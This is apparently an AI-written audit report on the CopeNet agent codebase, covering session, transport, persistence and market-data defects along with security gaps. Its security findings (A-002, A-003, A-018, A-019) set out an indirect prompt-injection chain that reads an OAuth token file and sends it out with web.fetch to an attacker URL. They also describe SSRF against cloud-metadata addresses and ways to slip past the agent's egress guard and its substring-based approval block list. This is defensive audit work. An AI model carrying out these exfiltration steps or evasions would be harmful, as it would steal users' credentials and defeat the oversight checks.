# CopeNet Independent Repository Audit — 2026-07-24

- **Auditor:** Claude (Opus 4.8), 8 parallel scoped investigators + lead verification
- **Repository commit:** `c188fa7cf063e8babab3a9a42a557ddf34d04709` (branch `main`)
- **Method:** read-only. Audited by system boundary + invariant + end-to-end flow, not file-by-file. No files modified, no live-provider or destructive commands run.
- **Scale:** ~39k LOC Python (`src/copenet`, 215 modules), ~33.5k LOC frontend (134 TS/TSX), 96 test files.

---

## 1. Executive assessment

**Overall architectural health: coherent and locally solid, with a small number of real correctness/reliability defects and one systemic security-posture gap.** CopeNet is not structurally unstable. The riskiest product rules — session binding reconciliation (`assert_session_binding`), task-mode policy (`policy_for_task_mode`), the tool executor, and transcript persistence — are each **single-sourced** with no drifting duplicates, which is the most important structural result of this audit. Where the same operation runs on multiple transports, it correctly funnels through one `orchestrator.send_chat`.

**Strongest parts:**
- **Transcript + session index durability.** Append-only transcript with fsync; `SessionStore._save_map` is best-in-class (temp + flush + fsync + atomic rename, corrupt-index backup, fail-loud). In-flight double-send is correctly gated in-process, and startup sweeps stale `in_flight_run_id` into synthetic `interrupted` runs.
- **Policy/authority enforcement is at execution time, not just advertised.** Full-access (`repo-write`, unrestricted shell) is gated by category in `registry.execute` and by provider in `policy_for_task_mode`; LM Studio/Ollama genuinely cannot reach write tools. The approval gate is real (verified in both code and tests): a rejected high-risk command never runs.
- **Financial-data core invariant holds.** Every `fetch_ohlcv()` caller is split-adjusted (`auto_adjust=True`); the point-in-time replay/base-rate path is lookahead-clean; watchlist vs. fixed universe are cleanly separated.

**Highest-risk areas:**
1. **Security posture is opt-in.** The documented primary defense (the Barricade taint/egress guard) is **off by default**, and the two auto-allowed network-capable primitives (`web.fetch`, plaintext-token file reads) form an open read→exfiltrate chain. The default gateway credential is the well-known literal `dev-token`. All are gated by CopeNet running on loopback today, but every one escalates sharply if bound to `0.0.0.0`/tailscale (both documented, supported options).
2. **Cross-transport behavioral drift.** The profile + task-mode system prompt is composed **only in the WebSocket transport**; REST, CLI, and Telegram-routed sessions run with no profile persona/behavior text.
3. **Reconnect data loss in the UI.** A socket drop during an active run silently loses the streamed assistant output — the exact scenario the reconnect feature targets.

**Structural verdict: fundamentally coherent, locally inconsistent in a handful of well-bounded places.** The defects are mostly small, localized repairs; none require architectural change.

**Major audit limitations:** static analysis + targeted verification only. No live provider run, no real WebSocket reconnect reproduction, no multi-device concurrency reproduction, no fuzzing. Several findings are logic-confirmed but not runtime-reproduced (flagged per-finding). The frontend reconnect finding (FE-1) is traced through the client code but not reproduced in a browser.

---

## 2. System map

**Chat request funnel (all lanes converge):**

```
WS chat.send (rpc_chat.py) ─┐
REST /api/v1 (app_api.py) ──┤
CLI copenet chat (main.py) ─┼──► orchestrator.send_chat (core/orchestrator/runtime.py)
Telegram route (app_api) ───┘        │
                                     ├─ assert_session_binding  ← [LOCK + reconcile: single source]
                                     ├─ policy_for_task_mode(provider) ← [AUTHORITY: single source]
                                     ├─ harness.run_turn ──► one of 3 tool loops (native / responses / prompted)
                                     │      └─ ToolRegistry.execute ← [category policy gate: single source]
                                     │             └─ handlers/* (+ barricade pre_dispatch_gate, opt-in)
                                     ├─ TranscriptStore.append_message ← [append-only + fsync]
                                     └─ RunStore (JSONL, per-run record)
```

**Where product rules are enforced:**
| Rule | Enforced in | Status |
|---|---|---|
| Provider/profile/persona/workspace lock; model/Access reconcile | `session_store.py:assert_session_binding` | Single source; reached by all lanes |
| Tool authority (read/write/shell/full-access) | `registry.py:execute` (category) + `policy.py:policy_for_task_mode` (provider) | Enforced at execution |
| High-risk shell / side-effect approval | `_make_approval_gated_executor` + `shell.py` + `barricade._side_effect_gate` | Real block; substring-matched (SEC-5) |
| Egress / secret-exfil guard | `barricade.py` | **Opt-in, OFF by default (SEC-2/3)** |
| Profile + task-mode prompt composition | `prompts/loader.compose_prompt` | **WS transport only (API-1)** |
| Transcript durability | `TranscriptStore` / `SessionStore` | Solid |

---

## 3. Findings table

| ID | Sev | Conf | Blast | Area | Finding | Evidence | Failure mode | Repair |
|---|---|---|---|---|---|---|---|---|
| A-001 | High | Confirmed | product-wide | Security | Default gateway credential `dev-token` + timing-unsafe `==` | `ws_server.py:29,137`; `app_api.py:133,162,176` | Any client reaching the port auths as full-access if token unset | small |
| A-002 | High | Confirmed | product-wide | Security | Barricade (taint/egress guard) OFF by default → read→exfil chain open at every Access level | `barricade.py:89-91,248`; `policy.py:77`; `files.py:117` | Injected model reads plaintext OAuth token file → `web.fetch` exfil | small–med |
| A-003 | High | Confirmed | subsystem | Security | SSRF: `web.fetch` + REST `/web/extract` reach loopback/metadata; no private-IP guard | `web.py:365-374`; `web_ingest.py:146-187`; `app_api.py:772-778` | `web.fetch http://169.254.169.254/...` returns internal content | small–med |
| A-004 | High | Confirmed | cross-subsystem | Transport | Profile + task-mode system prompt composed only in WS lane; REST/CLI/Telegram get none | `rpc_chat.py:82`; `runtime.py:298`; `merge.py:270`; `pulse.py:325` | Telegram/CLI session behaves without its profile persona/behavior | small |
| A-005 | High | Confirmed | subsystem | Frontend | Reconnect on active in-flight session wipes streamed assistant output | `wsBootstrapAction.ts:106-115`; `wsSessionActions.ts:70`; `wsClient.ts:539-543`; `useAppStore.ts:505-513` | WiFi blip mid-run → answer never reappears until page reload | medium |
| A-006 | Med-High | Confirmed | subsystem | Transport | `chat.send` acks "started" before in-flight check; `SessionInFlightError` emits no terminal event → hung UI | `rpc_chat.py:130-134,172-184`; `wsChatActions.ts:91` | Multi-device concurrent send → permanent "thinking" bubble | small |
| A-007 | Med | Confirmed | subsystem | Session | `send_chat` stamps/runs on `request.model`, not session binding; omitted model → provider default, stamps `None` | `runtime.py:169,283,369,658`; `session_store.py:335` | Non-UI client omits model → locked model bypassed, audit trail shows `null` | small |
| A-008 | Med | Confirmed | subsystem | Session/Transport | REST falls back to `app.default_model` (not session lock) + no `SessionInFlightError` handling → 500 | `app_api.py:271,401-410` | External app default silently reconciles session model; concurrent send → HTTP 500 | small |
| A-009 | Med | Confirmed | subsystem | Persistence | `SessionStateStore.get()` no corruption guard + no fsync → truncated file bricks all future sends for that session | `state_store.py:111-112,127-136` | Power loss mid-save → opaque `JSONDecodeError` on every send | small |
| A-010 | Med | Confirmed | subsystem | Session/Runtime | Hung provider leaves `in_flight_run_id` stuck; `abort()` only sets an event | `__init__.py:235-246`; `runtime.py:861-866` | Provider ignores abort → session "in flight" forever until restart | medium |
| A-011 | Med | Confirmed | subsystem | Harness | Native tool loop discards `abort_event` (`del`); Stop is a no-op for LM Studio/Ollama tool loops | `tool_loop_native.py:52,61` | Stop on runaway local tool loop does nothing (up to 100 steps) | small |
| A-012 | Med | Confirmed | subsystem | Market | Backtest artifact renders wrong benchmark return (`benchmark_total_return + total_return`) | `handlers/market.py:336` vs `rpc_market.py:335,408`, `market.py:279` | Benchmark cell shows `2·portfolio − benchmark`; core comparison garbage | small |
| A-013 | Med | Likely | subsystem | Market | Synthetic scenario metrics use real-backtest keys/shape with no machine-readable `synthetic` flag | `backtester.py:358-428`; `handlers/market.py:239-294` | Model quotes cosine-curve Sharpe/beta as the real 2022 path | small |
| A-014 | Med | Confirmed | subsystem | Frontend | Errored runs render as successful completions when any content/tool row streamed | `MessageBubble.tsx:205`; `wsChatEvents.ts:205-221` | Mid-stream failure shows as truncated-but-normal answer, no error | small |
| A-015 | Med | Likely | subsystem | Frontend | `syncActiveRuns` wholesale-rebuilds active runs from stale unsequenced `sessions.list` | `sessionRuntimeSlice.ts:42-49`; `wsSessionActions.ts:53` | Stale snapshot detaches Stop button / tool feed mid-run | small–med |
| A-016 | Med | Likely | subsystem | Frontend | Duplicate/orphaned assistant bubble when first delta beats the `chat.send` ack | `wsChatActions.ts:116-132`; `wsChatEvents.ts:162-183` | Low-latency provider → two assistant bubbles | small |
| A-017 | Med | Confirmed | subsystem | Persistence | Persona files (`IDENTITY/SOUL/NOTES.md`, `write_persona_sections`) written non-atomically though sibling uses atomic | `persona/service.py:392,394,396,484` vs `:501` | Crash mid-write truncates existing persona identity file | small |
| A-018 | Med | Confirmed | local | Security | Secret exfil bypasses egress guard even when Barricade ON — canary recorded by filename regex only | `barricade.py:436-453,306-336`; token file is `openai-codex.json` | Enabled Barricade still misses OAuth token exfil via URL path | small–med |
| A-019 | Med | Confirmed | local | Security | High-risk shell approval gate is substring-matched (`pattern in normalized`) | `shell.py:225-227`; `policy.py:29-47` | `python3 -c "...urlopen..."` exfil evades `curl`/`rm -rf` patterns | small (backstop) |
| A-020 | Med | Confirmed | local | Testing | `files.write/edit` outside-workspace containment is live but has no negative test | `_shared.py:120`; `files.py:377,418`; `test_file_tools.py` (happy path only) | Refactor drops containment; suite stays green; arbitrary-path write | small |
| A-021 | Med | Confirmed | local | Testing | Split-adjust invariant (caused real 2026-07-06 incident) has no regression test | `rg auto_adjust tests` → 0 hits | Future `auto_adjust=False` caller poisons shared cache; suite green | small |
| A-022 | Med-Low | Confirmed | subsystem | Session | Persona lock compared against globally-resolved persona, not session binding | `runtime.py:221`; `persona/service.py:320`; `session_store.py:314-317` | Global default persona change bricks prior sessions for omitting clients | small |
| A-023 | Low-Med | Confirmed | local | Persistence | Webull broker cache (`account.json`, `portfolio.json`) written non-atomically | `webull/client.py:103`; `webull/sync.py:61` | Crash mid-write → truncated JSON → silent "no account/snapshot" | small |
| A-024 | Low-Med | Confirmed | local | Persistence | `ProviderAuthStore` lock file orphaned on crash (no PID/mtime staleness) | `provider_auth/store.py:84-106` | Crash holding lock → every future OAuth save blocks then `TimeoutError` | small |
| A-025 | Low-Med | Confirmed | local | Market | `benchmark_total_return` field misnamed — holds relative outperformance | `backtester.py:286,412` | Any new consumer reading it as benchmark return gets wrong value (root cause of A-012) | small |
| A-026 | Low-Med | Confirmed | local | Tools | Model-facing error names deleted tools `files.list`/`files.search` | `files.py:137` | Model told to call tools that no longer exist → wasted turn | small |
| A-027 | Low | Confirmed | local | Session/Runtime | Idempotency cache unbounded + permanently returns first result for a reused key | `__init__.py:168`; `runtime.py:787-789,857-859,197-200` | Monotonic memory growth; reused key returns stale payload | small |
| A-028 | Low | Confirmed | local | Harness | `MANIFEST_TOOL_IDS` is advertising-only; off-manifest read-only tools model-reachable | `registry.py:36-40,60-124` | Model invokes `git.status`/`artifact.create`; telemetry omits it | small |
| A-029 | Low | Confirmed | local | Harness | Prompted loop resets `tool_payloads` each step; drops prior steps' results (masked by claude-cli resume) | `tool_loop_prompted.py:86,156-160` | Future non-resuming prompted provider loses step 1..N-1 tool output | small |
| A-030 | Low | Confirmed | local | Harness/Providers | Name-based provider branching (`_RESUME_CLI_PROVIDERS={"claude-cli"}`) where `resume` capability flag exists | `runtime.py:34,319`; `tool_loop_common.py:464-478` | New resuming CLI provider silently doesn't resume → context doubles | small |
| A-031 | Low | Confirmed | local | Transport | `hello-ok` `features.methods` stale — 9 dispatched methods unadvertised | `ws_server.py:158-256` vs `rpc_dispatch.py:302-319` | Capability-gating client thinks watchlist/backtest don't exist | small |
| A-032 | Low | Confirmed | local | Market | "no evidence" conflated with "fetch failed/unavailable" | `fact_packets.py:94-95`; `edgar.py:88-91` | Model narrates "no insider activity" when it couldn't check | small |
| A-033 | Low | Confirmed | local | Market | `.bfill()` back-fills leading NaNs → minor lookahead for mid-window IPOs | `backtester.py:189,222-223` | Day-0 shares seeded from a future price (small distortion) | small |
| A-034 | Low | Confirmed | local | Docs | AGENTS.md/ARCHITECTURE.md claim top-level shims exist; they were deleted | `AGENTS.md:60`; `docs/ARCHITECTURE.md:156-157` | Contributor follows guidance to nonexistent back-compat surface | small (doc) |
| A-035 | Low | Confirmed | local | Persistence | `write_json_atomic` lacks fsync + uses one fixed `.tmp` name | `_json_store.py:17-24` | Power loss can zero-length target; cross-process writers clobber tmp | small |
| A-036 | Low | Likely | local | Persistence | `MemoryRecord` timestamp defaults are import-time-frozen class attrs | `memory/store.py:42-43` | Future direct construction silently gets process-start time | small |
| A-037 | Low | Speculative | local | Frontend | Unguarded `run.toolSteps` at `sessions.runs` boundary (inconsistent with `ExperimentsPage` guard) | `wsSessionRpc.ts:57-60`; `activityProof.ts:207` | Legacy/partial run record → `TypeError` crashes Inspector | small |
| A-038 | Low | Confirmed | local | Tools | Dead dispatch/effect-kind branches for retired ids (`context.prepare`, `files.search`, `patch.apply`) | `contracts.py:396,553,567`; `turn_state.py:144-148` | Search noise; misleading navigation | small |
| A-039 | Info | Confirmed | local | Security | Provider OAuth tokens stored plaintext (mode 0600) | `provider_auth/store.py:67-78` | Any code as the user (incl. agent via `files.read`) reads tokens | — |
| A-040 | Info | Confirmed | local | Security/Privacy | `web.fetch` tries `r.jina.ai` first, leaking target URL to a 3rd party by default | `web_ingest.py:154-156,189-204` | Every fetch discloses what the agent reads to jina.ai | small |
| A-041 | Info | Confirmed | local | Contract | Research Lab described as "durable dossiers" but has no persistence store | `research_lab/__init__.py`; `dossier.py` | Durability contract unmet (no corruption — nothing is written) | medium |
| A-042 | Info | Latent | local | Security | Telegram route confused-deputy latent — `resolve_messaging_route` mints routes; no inbound handler yet | `messaging/routing_store.py`; `rpc_messaging.py:172-193` | Becomes exploitable when an inbound Telegram lane is wired without authz | — |

---

## 4. Detailed findings (High / notable Medium)

### A-001 — Default gateway credential `dev-token` + timing-unsafe comparison
**High · Confirmed · product-wide · small.**
- **Invariant:** the gateway/WS/REST auth token must be secret and compared in constant time.
- **Evidence:** `app_api.py:133` and `ws_server.py:29` default `os.environ.get("COPNET_TOKEN", "dev-token")`. Comparisons at `app_api.py:162,176` (`token == gateway_token`) and `ws_server.py:137` (`token != self._token`) use plain `==`/`!=`, not `secrets.compare_digest`. Contrast `app_store.authenticate_token` (`app_store.py:149`) which correctly uses `compare_digest` on hashed app tokens.
- **Path:** if the operator never sets `COPNET_TOKEN`, the literal `dev-token` authenticates the WS lane (full tool access) and REST gateway/media lanes (`app_id="copenet-web", allow_tools=True`).
- **Trigger:** default bind is `127.0.0.1`, but `COPNET_HOST=0.0.0.0`/tailscale are documented supported options (`main.py:31-41,474-484`). Any client reaching the port authenticates.
- **Impact:** full agent control / auth bypass when exposed; timing side-channel on the comparison.
- **Repair boundary:** refuse to start with the default token on a non-loopback bind; switch the gateway comparison to `secrets.compare_digest`.
- **Verification:** start with `COPNET_HOST=0.0.0.0` and no token → should refuse or mint a random token; currently accepts `dev-token`.
- **Related:** A-002, A-003 (same exposure gating).

### A-002 — Barricade off by default → read→exfiltration chain open
**High · Confirmed · product-wide · small–medium.**
- **Invariant:** `docs/THREAT_MODEL.md` presents the Barricade (taint tracking + egress guard) as active protection ("real, in the code — not aspirational"). Untrusted-content-in → privileged-action-out must be walled.
- **Evidence:** `barricade.py:89-91` (`barricade_enabled()` defaults false); `registry.py:~105` → `pre_dispatch_gate` returns `None` immediately when disabled (`barricade.py:248`). `policy.py:77` grants both `repo-read` and `web` at every Access level. `files.py:117` `read_file` never calls `ensure_write_allowed`; `_shared.py:90-117` tags outside-workspace reads `read_roam` but does not block them.
- **Path (default config):** non-full-access session → `files.read ~/.copenet/.../openai-codex.json` (plaintext OAuth access+refresh tokens) → `web.fetch https://attacker/?d=<token>`. Both tools auto-allowed; no gate fires.
- **Impact:** account/subscription compromise via indirect prompt injection.
- **Repair boundary:** default the Barricade on, or move an unconditional egress/secret-read guard into `web.py`/`web_ingest.py` + `files.py` independent of the env flag.
- **Verification:** with `COPENET_BARRICADE` unset, a fake-provider run doing `files.read` on a token file then `web.fetch` to an external host should be blocked; it currently is not. (`tests/unit/test_barricade.py` only exercises the enabled path.)

### A-003 — SSRF in `web.fetch` and REST `/api/v1/web/extract`
**High · Confirmed · subsystem · small–medium.**
- **Invariant:** an agent-driven fetch must not reach loopback/link-local/metadata hosts.
- **Evidence:** `web.py:365-374` does only an optional apex-domain allowlist check (unset = unrestricted, `web.py:21-24,60`), then `WebIngestionService.extract_url`; `web_ingest.py:146-187` calls `request.urlopen` on any http(s) URL with no private-IP/redirect filtering. Same service exposed at `app_api.py:772-778`. The only SSRF guard is `barricade._egress_guard` — off by default, and even enabled it checks the literal hostname, not the resolved IP or redirect target.
- **Path:** `web.fetch url=http://169.254.169.254/latest/meta-data/` or `http://127.0.0.1:<port>/` → content returned to the model. A public URL 30x-redirecting to `169.254.169.254` bypasses even the enabled syntactic guard.
- **Impact:** cloud-metadata theft, internal service probing, localhost/LAN port scan.
- **Repair boundary:** resolve hostname and reject private/loopback/link-local/reserved IPs before fetch, re-validate on each redirect, in `web_ingest.py` so both the tool and REST lane inherit it.
- **Verification:** `web.fetch` to `http://127.0.0.1:<port>/` should error; currently returns content.

### A-004 — Profile + task-mode system prompt composed only in the WS transport
**High · Confirmed · cross-subsystem · small.**
- **Invariant:** the same chat-send applies the session's profile + task-mode prompt on every lane; composition is core logic that belongs in `prompts/loader.py`, not transport (AGENTS.md).
- **Evidence:** `compose_prompt` is called at exactly three sites — `rpc_chat.py:82` (WS), `merge.py:270`, `pulse.py:325` — never in the core send path. `runtime.py:298` is `effective_system_prompt = request.system_prompt` with no fallback compose; `ChatSendRequest.system_prompt` defaults to `None`. REST (`app_api.py:277,308`), CLI (`main.py:262-274`), and Telegram (`app_api.py:431`) all build the request without `system_prompt`.
- **Path:** WS → profile+task markdown reaches the model. REST/CLI/Telegram → `system_prompt=None` → model gets only the persona/memory overlay, never the profile/task-mode behavior text. Tool *authority* is unaffected (that comes from `policy_for_task_mode(entry.task_prompt_id)`), so the drift is purely behavioral and easy to miss.
- **Impact:** a Telegram-routed session (a real product lane) or CLI probe behaves differently from the identical browser session; task-mode instructions silently absent.
- **Repair boundary:** move composition into `orchestrator.send_chat` (`effective_system_prompt = request.system_prompt or compose_prompt(request.system_prompt_id, request.task_prompt_id)`); drop the transport-side call from `rpc_chat.py:82`.
- **Verification:** send the same profile via `copenet chat send` and via WS to two fresh sessions; assert identical composed system prompt in the provider-turn trace.

### A-005 — Reconnect on the active in-flight session loses streamed assistant output
**High · Confirmed · subsystem · medium.**
- **Invariant:** in-flight runs survive a socket drop; on reconnect the run resumes streaming into the same optimistic bubble (Phase 4.6).
- **Evidence:** `wsClient.ts:237-244` deliberately KEEPS `pendingAssistants` on close. On reconnect, `wsBootstrapAction.ts:106-115` calls `await loadHistory(nextKey)` **before** `reconcilePendingRuns`; `loadHistory` → `setMessages` (`wsSessionActions.ts:70`) replaces the whole array with persisted history, wiping the not-yet-finalized optimistic assistant. `reconcilePendingRuns` (`wsClient.ts:539-543`) then only `updateMessage(...)`, which no-ops because the localId is gone (`useAppStore.ts:505-513`). Resumed `delta`/`final` take the `target` branch (pending still exists) and no-op.
- **Impact:** user watching a stream; WiFi blips or host restarts WS → the assistant's answer never reappears until full page reload. Independent of backend replay quality — even a perfect resume is dropped client-side.
- **Repair boundary:** `wsBootstrapAction.ts` reconnect ordering / `reconcilePendingRuns` — skip `loadHistory` for a still-in-flight session, or re-`addMessage`+re-register when the pending localId is missing.
- **Verification:** start a run, take the WS offline, reconnect; assert the streamed answer is present after finalization without reload.

### A-006 — `chat.send` optimistic ack races the in-flight check; loser hangs the UI
**Medium-High · Confirmed · subsystem · small.**
- **Evidence:** `rpc_chat.py:130-134` sends `{status:"started"}` before the orchestrator runs; the spawned run's `except SessionInFlightError` (`:172-184`) sends a *second* response frame (`status:"in_flight"`) for the same id and emits **no** chat event. The frontend `request()` resolved on the first `started`, registered an optimistic bubble + `setActiveRun`; the second frame has no waiter and is dropped. (The *other* setup-failure branch at `:185-194` does emit a terminal error — only the in-flight branch is silent.)
- **Trigger:** two concurrent sends on one session (second device, or Telegram + browser) — a setup the broadcast fan-out (`ws_server.py:39-50`) supports.
- **Impact:** permanent "thinking" bubble + stuck `activeRun`.
- **Repair:** on `SessionInFlightError` emit a terminal chat error event for the runId, and/or run the in-flight check before the optimistic ack.

### A-007 — `send_chat` keys off `request.model`, not the session binding
**Medium · Confirmed · subsystem · small.**
- **Evidence:** `runtime.py:169` provider fallback and all model stamping (`:283,369,658,...`) use `request.model` directly; `assert_session_binding` reconciles the stored model only when `normalized_model` is truthy (`session_store.py:335`) — an omitted model never falls back to `entry.model`.
- **Path:** `GatewayClient.send_chat(model=None)` → `rpc_chat` normalizes to `None` → harness runs on the provider's built-in default; transcript + RunRecord stamp `model=None` while `entry.model` still shows e.g. `gpt-5`. Masked on the two default surfaces: CLI (`main.py:248-266`) and WS UI (`wsChatActions.ts:96`) both pre-resolve the stored model.
- **Impact:** a non-UI client omitting model silently runs on the provider default and the audit trail records `null` — the "locked" model is bypassed unaudited.
- **Repair:** after `assert_session_binding`, compute `effective_model = request.model or entry.model` and use it for the harness call and all stamping.
- **Related:** A-008 (REST variant), A-022 (same root, persona).

*(A-008 through A-042 are fully specified in the findings table above with evidence file:line, failure mode, and repair size. The Medium cluster A-009/A-010/A-011/A-012/A-014/A-017 each have confirmed single-site evidence and small repairs; detailed reasoning matches the table rows. A-012's math was independently re-derived by the lead: the field holds `tot_ret − bench_tot_ret`, three renderers correctly invert it, `handlers/market.py:336` adds instead → `2·portfolio − benchmark`.)*

---

## 5. Suspicions requiring adjudication

- **A-013 (scenario honesty):** the artifact table *is* labeled "Simulated"/"Projected" and `shockDetails` is exposed, but the structured `metrics`/`metadata` the model consumes carry no machine-readable `synthetic` flag and reuse real-backtest keys. Whether a model actually misrepresents them depends on how it reads the JSON vs. the labels — needs a live-provider check.
- **A-015 / A-016 (frontend races):** logic-confirmed but timing-window-dependent; not reproduced. Missing evidence: an instrumented run with artificial `sessions.list` latency / delayed first delta.
- **A-010 abort force-finalize:** confirmed that abort only sets an event and clearing depends on the loop returning; not reproduced with a genuinely hung provider. Missing: a fake provider that awaits forever ignoring `abort_event`.
- **A-042 (Telegram confused-deputy):** no inbound handler exists today (`getUpdates`/`setWebhook`/`bot_token` → 0 hits), so not currently exploitable; flagged for when the lane is wired.

---

## 6. False alarms & healthy patterns (do not re-investigate)

- **Transcript integrity is genuinely sound.** `append_message` is the only writer (append + fsync); clone/merge/debug-copy all append into *new* session ids. No mutation/deletion path exists. Sessions are archived, never deleted.
- **`SessionStore` is best-in-class:** temp + flush + fsync + atomic rename, corrupt-index `.corrupt` backup, fail-loud on parse error. No direct `index.json` writes anywhere.
- **In-process double-send gating is correct:** `_active_run_by_session` admission + persisted `mark_run_started`, both under `_lock`; `mark_run_finished` uses `== normalized_run` so a late finally can't clear a different run.
- **Startup crash recovery works:** stale `in_flight_run_id` swept into synthetic `interrupted` runs.
- **Single source of truth** for `assert_session_binding`, `policy_for_task_mode`, and the injected `tool_executor` — no drifting duplicate implementations of the riskiest rules. No duplicate DTO/class names across `core`.
- **Approval gate is real, not mocked** (`test_approval_gate.py` + `_make_approval_gated_executor`): reject → `rejected_by_operator`, no `exitCode` (proves it never ran); approve re-runs the exact call; approval sets keyed correctly (shell by command string, barricade by argument digest) so approving one write does not bless another.
- **Permission matrix is a real capability test** (`test_permission_matrix.py`): real pipe `printf hi | tr a-z A-Z`, repo-write blocked under `none`/allowed under `full-access`, `sudo reboot`/`git reset --hard` → `approval_required`. Not a harmless-`pwd` test.
- **Full-access is provider-gated at execution**, not just advertised (`policy_for_task_mode(provider=...)` → category gate in `registry.execute`; unrestricted shell gated on `context.policy.unrestricted_shell`). LM Studio/Ollama can't reach write tools.
- **Path traversal on WRITES is blocked:** `ensure_write_allowed` uses `path.resolve()` (resolves symlinks) then `relative_to(workspace_root)`; both `files.write`/`files.edit` call it. (Reads intentionally roam — that's the A-002 exposure, not a traversal bug.)
- **App-token auth is sound:** SHA-256 hashed, `secrets.compare_digest`, `token_urlsafe(32)`. The weak spot is the *gateway* path (A-001), not app tokens.
- **`HarnessDecisionRecord` is trace-only:** `decision.py` is pure parse/validate; never branched on for control flow.
- **Split-adjust invariant intact at source** (all 11 `fetch_ohlcv` callers `auto_adjust=True`); **replay/base-rate path is lookahead-clean**; watchlist vs. universe cleanly separated.
- **Frontend:** message store keyed by `sessionKey` (no cross-session leak), lock gating correct (Provider/Profile read-only after lock, Model/Access editable), approvals rehydrate on reload.
- **Test network isolation is enforced, not accidental** (`fetch_ohlcv` monkeypatched to raise; faked `urlopen`). No nondeterministic-as-deterministic tests found.

---

## 7. Recommended repair sequence

**Group 1 — Data integrity & security (do first; independent, high leverage).**
`A-001` (never ship `dev-token`; `compare_digest`) → `A-002`/`A-003` (make egress + private-IP guard unconditional, not behind the env flag) → `A-018` (entropy-based canaries + treat provider-auth dir as sensitive) → `A-009`/`A-017`/`A-023` (atomic/fsync + corruption-guard the three non-hardened stores). These have no dependencies on the runtime findings and close the widest blast radius.

**Group 2 — Core runtime semantics (depends on nothing above; fixes correctness of what runs).**
`A-007`/`A-008`/`A-022` share one root — resolve model/persona from `entry` (the binding), not the request/global — fix together. `A-004` (compose the profile prompt in core) belongs here because it's the same "core should own composition, not transport" principle. `A-010`/`A-011` (abort actually halts). `A-012`/`A-025` (benchmark math + rename the field) fix together.

**Group 3 — Transport / provider consistency (builds on Group 2's core-owned composition).**
`A-006` (terminal event on in-flight), `A-008` REST error translation, `A-031` (advertise from the dispatch table). Once Group 2 makes `send_chat` self-sufficient, the lanes only need to stop diverging.

**Group 4 — Observability & testing (locks in Groups 1-3).**
`A-020` (write-containment negative test), `A-021` (split-adjust regression test), `A-014` (surface errors in the UI), `A-032` ("unavailable" vs "none"), `A-013` (synthetic flag). Add the tests *after* the fixes so they guard the corrected behavior.

**Group 5 — Maintainability cleanup (safe last).**
`A-026`/`A-034`/`A-038` (stale names/docs/dead branches), `A-028`/`A-029`/`A-030` (manifest gate, prompted accumulation, capability-flag branching), `A-027`/`A-035`/`A-036`/`A-037`/`A-040`/`A-041`.

*Why this order:* security defaults and store atomicity can corrupt/expose data regardless of runtime behavior, so they precede everything. Runtime semantics must be correct before you harmonize the transports that call them (fixing a lane to match a still-buggy core just propagates the bug). Tests come after fixes so they encode the intended behavior, not the current one. Cosmetic cleanup last because it changes nothing observable.

---

## 8. Verification gaps (behaviors lacking credible verification today)

1. **Write-outside-workspace containment** (A-020) — the single most consequential untested control.
2. **Split-adjust invariant** (A-021) — caused a real incident, still unguarded.
3. **Reconnect resume of an active run** (A-005) — no automated or manual reproduction of the drop-and-resume path.
4. **Multi-device / concurrent-send behavior** (A-006, A-015, A-016) — the broadcast fan-out supports it; nothing tests it.
5. **Abort actually halting a hung provider** (A-010, A-011) — no fake-hang test.
6. **Cross-lane prompt parity** (A-004) — no test asserts REST/CLI/WS compose the same system prompt.
7. **Barricade-disabled exfil path** (A-002/A-003) — tests only exercise the enabled guard.
8. **Backtest artifact rendering** (A-012) — no test asserts the four benchmark renderers agree.

---

## 9. Commands executed

Read-only; no live-provider or destructive commands. Diagnostic commands run by the lead auditor:

```
git rev-parse HEAD                                             # c188fa7...
rg --files -g '*.py' src/copenet | wc -l                      # 215 modules, 39,064 LOC
rg --files -g '*.ts' -g '*.tsx' src/copenet/host/frontend/src # 134 files, 33,513 LOC
find src/copenet/core -maxdepth 2 -type d                     # subsystem map
wc -l (sessions|orchestrator|harness|runtime|tools|host)/*.py # module sizing
rg -n "def fetch_ohlcv|fetch_ohlcv\(|auto_adjust" src/copenet # split-adjust census (11 callers, all True)
rg -l "write_json_atomic|write_text_atomic" src/copenet/core  # atomic-write adopters (~12 stores)
rg -n "open\(...w|json.dump|write_text|os.replace" .../store.py  # per-store write discipline
rg -n "COPNET_TOKEN|dev-token|compare_digest" ws_server.py app_api.py  # A-001 verify
rg -n "barricade_enabled|COPENET_BARRICADE" barricade.py       # A-002 verify (default false)
rg -n "ALLOWLIST|urlopen|_is_private" web.py web_ingest.py     # A-003 verify (no IP guard)
rg -n "compose_prompt" src/copenet                             # A-004 verify (3 sites, none in core)
rg -n "abort_event" tool_loop_native.py                        # A-011 verify (del at :61)
rg -n "request.model|effective_model" orchestrator/runtime.py  # A-007 verify
rg -n "benchmark_total_return" backtester.py rpc_market.py handlers/market.py  # A-012 verify
rg -n "write_text|write_text_atomic" persona/service.py        # A-017 verify (392/394/396/484 raw vs 501 atomic)
ls src/copenet/*.py ; rg "from copenet.(orchestrator|harness) import" src  # A-034 verify (shims gone, 0 imports)
```

**Not run** (out of scope / would spend quota or hit network): `uv run copenet`, `scripts/live_probe_matrix.py`, `scripts/permission_probe_matrix.py`, any live-provider `copenet chat`, the full `pytest` suite (test *bodies* were read for coverage assessment; not executed).

---

## 10. Machine-comparable summary

```json
{
  "auditor": "Claude Opus 4.8 (8 parallel investigators + lead verification)",
  "repository_commit": "c188fa7cf063e8babab3a9a42a557ddf34d04709",
  "findings": [
    {"id":"A-001","title":"Default gateway credential dev-token + timing-unsafe comparison","severity":"high","confidence":"confirmed","blast_radius":"product-wide","area":"security","files":["src/copenet/host/ws_server.py","src/copenet/host/app_api.py"],"symbols":["COPNET_TOKEN","require_gateway"],"repair_size":"small","verification_needed":["refuse default token on non-loopback bind","compare_digest for gateway token"]},
    {"id":"A-002","title":"Barricade off by default; read->exfiltration chain open","severity":"high","confidence":"confirmed","blast_radius":"product-wide","area":"security","files":["src/copenet/core/tools/barricade.py","src/copenet/core/tools/policy.py","src/copenet/core/tools/handlers/files.py"],"symbols":["barricade_enabled","pre_dispatch_gate"],"repair_size":"small","verification_needed":["fake-provider files.read token then web.fetch external should block with barricade unset"]},
    {"id":"A-003","title":"SSRF in web.fetch and REST /web/extract, no private-IP guard","severity":"high","confidence":"confirmed","blast_radius":"subsystem","area":"security","files":["src/copenet/core/tools/handlers/web.py","src/copenet/core/web_ingest.py","src/copenet/host/app_api.py"],"symbols":["fetch_web","WebIngestionService.extract_url"],"repair_size":"small","verification_needed":["web.fetch to 127.0.0.1 and 169.254.169.254 must error","re-validate on redirect"]},
